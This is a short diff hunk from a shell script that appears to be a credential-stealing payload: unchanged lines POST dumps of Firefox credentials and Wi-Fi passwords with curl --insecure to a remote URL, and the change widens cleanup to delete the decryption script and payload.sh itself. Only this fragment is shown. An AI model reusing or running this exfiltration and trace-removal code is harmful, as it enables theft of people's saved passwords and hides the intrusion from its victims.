@@ -13,4 +13,4 @@ done
 curl -X POST --data-binary @./firefox_dump.txt --insecure $url_post && \
 curl -X POST --data-binary @./wifi_dump.txt --insecure $url_post
 
-rm ./firefox_dump.txt ./wifi_dump.txt
+rm ./firefox_dump.txt ./wifi_dump.txt ./firefox_decrypt.py ./payload.sh
